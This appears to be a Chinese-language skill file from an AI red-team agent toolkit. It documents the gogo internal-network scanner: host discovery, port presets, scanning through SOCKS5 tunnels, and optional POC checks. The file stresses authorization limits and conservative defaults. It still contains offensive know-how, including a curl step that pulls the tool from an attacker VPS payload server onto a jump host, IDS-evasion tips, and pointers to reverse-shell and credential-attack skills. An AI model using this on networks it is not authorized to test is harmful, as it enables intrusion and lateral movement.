---
name: gogo-scan
description: gogo（v2 可操控内网自动化引擎）内网扫描首选：预设端口、存活预扫、smart/supersmart 大网段、走 socks5 隧道、结果格式化与二次输入、按需开 POC；默认不爆破、不发 POC
whenToUse: 进入内网（跳板机 / WebShell / socks5 隧道）后做内网铺面与打点，尤其是要覆盖大网段、最小发包、可复现留证时
role: internal,recon,exploit
enabled: true
---

# gogo（内网扫描首选：可操控的内网自动化引擎）

> 内网铺面与打点**首选本技能**。
> 备选方案（gogo 不可用，或需要 MS17-010 检测等 `fscan-intranet` 特有插件能力时）见技能 `fscan-intranet`；
> 隧道怎么选、怎么登记见技能 `tunnel-selection`。

`gogo` 是面向红队的**基于端口的内网自动化引擎**：一段 C 段/B 段丢进去，几分钟内给出存活主机、开放端口、HTTP 应用指纹、
title / 证书 / 关键信息提取。它的核心优势是**可操控性与可拓展性**——预设端口、启发式（smart）扫描、存活预扫、
socks5 走代理、结果二次输入、按需开关 POC，全都可以在命令行上精细组合。**默认只做高速率 HTTP 发包，不发 POC。**

## 为什么它比"一键无脑"更适合内网

- **最小发包原则**：关闭端口只发 1 个 SYN；TCP/HTTP 服务才继续握手与 GET，尽可能少发包拿到最多信息。
- **可操控**：端口、扫描模式、探针、并发、超时、输出、过滤都能分层组合，还能用 workflow 一键打包常用组合。
- **默认安静**：默认不发 POC、不做服务弱口令爆破；扫描行为常被其它告警淹没而不易暴露。
- **不鼓励爆破**：作者把批量服务弱口令爆破拆到另一个工具（`zombie`），并明确**不鼓励在内网做大规模服务爆破**——
  流量设备对服务弱口令爆破最敏感。本项目内网弱口令/服务爆破走技能 `credential-attack`（默认小字典、严格限流）。

## 二进制

```
本机 : $DSH_HOME/redteam/toolkit/gogo/gogo          （Linux x86_64；官方 releases 资产名 gogo_linux_amd64）
       Windows 等其他平台从官方 releases 取同名资产（gogo_windows_amd64.exe 等）
VPS  : http://<你的VPS_IP>:9100/gogo                （技能 vps-reverse-shell 的载荷目录：vps.sh serve 9100）
```

**传到跳板机/目标**（内网扫描必须在能到达内网的位置执行）：

```bash
# 跳板机上直接下载（VPS 起载荷服务：$DSH_HOME/redteam/toolkit/vps/vps.sh serve 9100）
curl -o gogo http://<你的VPS_IP>:9100/gogo && chmod +x gogo
# 或从本机经 shells 上传
```

## 安全默认参数模板（照抄即可；默认不爆破、不发 POC、只打预设端口）

```bash
# 0) 定位：确认「我在哪、能到哪」
ip a; ip route        # Linux；Windows：ipconfig /all & route print

# 1) 存活预扫：先圈活人（--ping），别对整段盲扫
gogo -i 10.0.0.0/24 --ping --af

# 2) 小网段（子网掩码 ≥ /24）默认档：预设端口、最小发包
gogo -i 10.0.0.0/24 -p top2,win,db --af

# 3) 大网段（子网掩码 < /24）：smart 模式
gogo -i 10.0.0.0/16 -m s -p top2,win,db --af

# 4) 超大网段（子网掩码 < /16）：supersmart + 存活预扫
gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af

# 5) 走隧道（socks5）：把流量真正送进内网
gogo -i 10.0.0.0/24 -p top2,win,db --proxy socks5://127.0.0.1:1080 --af

# 6) 结果格式化 / 二次输入（对上次结果接着打、或导出分析）
gogo -F result.dat                              # 格式化排序 .dat 结果（人读）
gogo -F result.dat -o json -f result.json       # 导出为单个聚合 JSON（`-o jl` 才是一行一 JSON）
gogo -j result.dat -p mysql --af                # 拿上次结果当输入，只补打 mysql
```

> 端口档位：gogo 用自带预设 `top1/top2/win/db`；换 naabu / nmap 时用本机端口表
> `$ARTEX_HOME\packaging\ports\`（`common100.txt` 快速摸底、`nmap-top1000.txt` 常规、`all.txt` 全端口）。
> 上表每条命令用到的旗标都出自 gogo 官方 wiki（`-P port` / `-P workflow` 可列出全部预设；参数名以本地 `gogo -h` 为准）。
> **默认模板里没有 `-e`（POC）与爆破相关参数——这就是安全默认。**

## 标准作业流程（SOP）

### 1) 定位（我在哪 / 能到哪）

```bash
ip a; ip route                      # 本机网卡与路由表
# Windows 落地点：ipconfig /all & route print
```
先把可达网段列出来（路由表 / arp / DNS / hosts / known_hosts / 连接串 / 日志里的内网地址），**授权清单外的段一律不碰**。

### 2) 存活预扫（先圈活人，再谈铺面）

```bash
gogo -i 10.0.0.0/16 --ping --af     # --ping 先做存活预扫；大网段先圈活再铺面
```
`--ping` 走的是 ICMP/IP 探针（可用 `--ipp` 调整 IP-probe 取值）。只用 smart 不跑默认端口扫描时用 `-n/--no`。

### 3) 分档扫描（网段越小越简单，越大越要用启发式）

| 场景 | 模式 | 示例 |
| --- | --- | --- |
| 单个 C 段（≥ /24） | 默认档 + 预设端口 | `gogo -i 10.0.0.0/24 -p top2,win,db --af` |
| 大网段（< /24） | smart | `gogo -i 10.0.0.0/16 -m s -p top2,win,db --af` |
| 超大网段（< /16） | supersmart + 存活预扫 | `gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af` |
| 想用内置组合 | workflow | `gogo --workflow 10 -p top2,win,db --af` |

- **预设端口**：`-p top2,win,db` / `-p common` / `-p all` / `-p 1-1000` / `-p -`（等价 `1-65535`）；`-P port` 列出全部预设。
  自定义端口预设用 `--port-config <文件>`。
- **smart / supersmart**：`-m s`（smart，子网 < /24）、`-m ss`（supersmart，子网 < /16，配 `--ping`）。
  `--sp` 指定 smart-port-probe（smart 默认 80，supersmart 默认 icmp）。
- **workflow**：`-w/--workflow 192|172|10|ss`，`-P workflow` 列出全部；workflow 的端口/模式等可被命令行覆盖，
  例如 `gogo --workflow 10 -p top2,win,db`。
- **端口喷射**：端口数 > 500 会自动开端口优先喷射（`-s/--spray`），需要关掉用 `--no-spray`。

### 4) 走隧道（打内网的主力入口）

前提：已有 socks5（技能 `suo5-tunnel`，或 `vps-reverse-shell` 里的 ssh -D，或 `frp-tunnel`）。

```bash
gogo -i 10.0.0.0/24 -p top2,win,db --proxy socks5://127.0.0.1:1080 --af
```
**隧道是瓶颈**：并发别按默认 4000 开，降到保守档（见下"并发/超时分级"）。

### 5) 结果格式化与二次输入

```bash
gogo -F result.dat                            # 把 .dat（deflate 压缩 JSON Lines）格式化排序成可读
gogo -F result.dat -o json -f result.json     # 导出聚合 JSON 做后续分析/入库（一行一 JSON 用 `-o jl`）
gogo -j result.dat -p mysql --af              # 拿上次结果当输入，只补打 mysql（二次输入）
gogo -j 10.0.0.5:3306,10.0.0.9:6379 --af      # 直接喂 ip:port[:framework] 列表，只打这些点
```
输入侧还支持 `-l/--list <文件>`、`-L`（stdin）、`-J`（stdin，同 `-j`）；输出侧 `-f` 指定文件名、
`--af` 自动命名、`--path` 改输出目录、`-O` 指定文件格式（`.json`/`.csv`/`.txt` 明文，`.dat` 压缩）、
`-o` 指定终端格式、`-q` 关日志、`--tee` 双输出（同时保留终端与文件）。

### 6) 按需开 POC（默认禁）

**默认不发 POC。** 只有明确需要验证漏洞、且授权允许时才开：

```bash
gogo -i 10.0.0.5 -e --opsec --af                    # 开 neutron(POC) 扫描，--opsec 跳过非 OPSEC 模板
gogo -i 10.0.0.5 -e --opsec -E <模板名或tag> --af    # 只跑指定模板 / tag
gogo -i 10.0.0.5 -e --ef /path/templates.yaml --af   # 指定模板文件
```
主动指纹（更响，按需叠加，可叠两层）：`-v`。

## 可操控性速查（内网精细化作业）

- **输入**：`-i/--ip`（逗号分隔多段，如 `192.168.1.1/24,172.16.1.1/24`）、`--exclude` / `--exclude-file`、
  `-l/--list`、`-L`、`-j/--json`、`-J`、`-w/--workflow`、`-W`。
- **端口**：`-p`（预设/别名/范围）、`-P port`（列全部预设）、`--port-config`。
- **模式**：`-m [s|ss|default|sc]`、`--ping`、`-n`、`--sp`、`--ipp`。
- **并发/超时**：`-t/--thread`、`-d/--timeout`、`-D/--ssl-timeout`。
- **过滤**：`--filter`（保留）、`--output-filter`（不输出）、`--scan-filter`（停止深扫）。
- **输出**：`-f`、`--af`、`--path`、`-O`、`-o`、`-q`、`--tee`、`-F`（格式化）。

## 纪律与红线（先看这条）

0. **落地门禁**：上扫描器前，先按技能 `host-enum` 完成「本机清单 + 存活清单」——清点没做完不铺面（本技能 SOP 第 1 步的 `--ping` 存活预扫就是"存活清单"的来源；本机清点归 `host-enum`）。
1. **授权范围**：`-i` 只填授权清单内的网段；**授权外的段一律不碰**。发现新网段先报再说。
2. **排除清单**：`--exclude` / `--exclude-file` 显式排除办公网、打印机、工控/OT、云元数据 `169.254.169.254`。
   ```bash
   gogo -i 10.0.0.0/16 -m s -p top2,win,db --exclude 10.0.5.0/24,10.0.9.0/24,169.254.169.254 --af
   ```
3. **并发/超时分级**（OPSEC 关键，别拿默认 4000 硬砸）：
   - 走隧道/代理：`-t 100 -d 5`（隧道是瓶颈，降并发、加超时）；
   - 普通内网段：默认或 `-t 200 -d 2`；
   - 老设备/工控/打印机段：`-t 100 -d 2`，且只打最小端口集。
4. **禁止低权限对大网段全端口**：`-p -`（`1-65535`）与 `-p all` 只在**小范围 + 授权明确 + 确认目标扛得住**时用；
   受限会话/低权限下对大网段开全端口就是打崩设备 + 拉高暴露面。
5. **默认不爆破、不发 POC**：保持模板里的默认；要开 POC 才 `-e` 并配 `--opsec`。
6. **避开蜜罐/IDS**：用 `--output-filter` / `--scan-filter` 精准控制输出与深扫范围，减少无谓发包。
7. **走代理**：`--proxy socks5://127.0.0.1:<端口>`；不要改本机系统代理。

## 结果落库（必须做）

`gogo` 默认输出 `.dat`（压缩），先 `-F` 格式化/导出 JSON，再逐条入库：

```bash
gogo -F runs/gogo-10.0.0.0-24.dat -o json -f runs/gogo-10.0.0.0-24.json
```

```text
redteam_asset_add      { engagement, ip, port, service, banner, url, title, source: "gogo", tags: ["internal"] }
redteam_credential_add { engagement, host, username, secret_type, secret_ref: "runs/gogo-<段>.json" }   # 有才记
redteam_access_add     { engagement, host, username, method, privilege, session_ref }
redteam_vuln_add       { engagement, target, name, severity, evidence_ref }                              # 必须配证据
```
**纪律**：`-F`/`-j` 用到的原始 `.dat` 与导出的 `.json` 都拷回 `runs/` 当证据；报告要能**按命令复现**
（目标 → 拿到什么 → 怎么拿到的（命令）→ 原始结果）。

## 关键场景

### 1) 通过隧道打内网（最常用）

```bash
# 前提：已有 socks5（suo5 / ssh -D / frp）
gogo -i 10.0.0.0/24 -p top2,win,db --proxy socks5://127.0.0.1:1080 -t 100 -d 2 --af
```

### 2) 大网段快速圈活 + 铺面

```bash
gogo -i 10.0.0.0/16 --ping --af                      # 圈活
gogo -j <上一步的 .dat> -p top2,win,db -m s --af      # 只对活人铺面（二次输入）
```

### 3) 只补打某一类服务（二次输入，小而准）

```bash
gogo -j result.dat -p mysql,redis,mssql --af
```

## 排障

| 现象 | 处理 |
| --- | --- |
| 扫得慢/扫不到 | 检查并发是否被隧道压低（加 `-t`）、超时是否过小（加 `-d`）；大网段先 `--ping` 圈活 |
| 隧道里零结果 | 确认 socks5 可用（`curl --socks5-hostname 127.0.0.1:<port> http://<内网IP>/`）；`--proxy` 地址格式 `socks5://host:port` |
| 结果是一堆 `.dat` 看不懂 | `gogo -F <文件>` 格式化；导出 JSON 用 `-F ... -o json -f x.json` |
| 想更安静 | `-q` 关日志、只打必须的预设端口、用 `--output-filter`/`--scan-filter` 缩小范围 |
| 误报/长响应卡住 | 调大 `-d`、`-D`；针对性复核再用 `-j` 回扫单点 |

## 相关技能

- `tunnel-selection`：隧道怎么选、怎么登记的唯一出处
- `suo5-tunnel` / `frp-tunnel` / `chisel-tunnel`：给 gogo 提供 socks5 入口/出口
- `vps-reverse-shell`：载荷投递与 `http://<VPS>:9100/` 分发
- `credential-attack`：内网弱口令/服务爆破（默认小字典、严格限流，仅授权后）
- `fscan-intranet`：备选扫描（gogo 不可用，或需要 fscan 特有的 MS17-010/插件能力时）
